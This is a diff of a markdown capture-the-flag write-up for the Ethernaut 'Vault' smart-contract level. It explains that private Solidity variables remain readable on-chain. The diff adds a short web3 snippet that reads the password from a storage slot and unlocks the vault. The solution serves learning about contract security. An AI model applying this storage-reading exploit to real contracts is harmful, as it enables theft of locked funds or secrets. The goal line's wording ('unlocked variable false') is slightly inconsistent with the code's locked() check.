@@ -1,4 +1,4 @@
-[Level 8. Vaalt](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)
+[Level 8. Vault](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)
 
 ## Concepts
 
@@ -8,7 +8,7 @@
 
 ## Level Target
 
-Unlock the vault(make unlocked variable false).
+1. Unlock the vault(make unlocked variable false).
 
 ## Breakdown & Analysis
 
@@ -18,6 +18,14 @@ Unlock the vault(make unlocked variable false).
 
 3. However, the primary purpose of visibility modifiers (`public`, `external`, `internal`, `private`) is to restrict access for other contracts and functions, but the data can still be viewed on the chain. It's also worth noting that `external` cannot be applied to state variables.
 
-
+4. 
 
 ## Detailed Steps
+
+```js
+password = await web3.eth.getStorageAt(contract.address, 1) // get password by accessing the slot
+await contract.unlock(password) 
+await contract.locked() === false // check if the vault is open now
+```
+
+## 
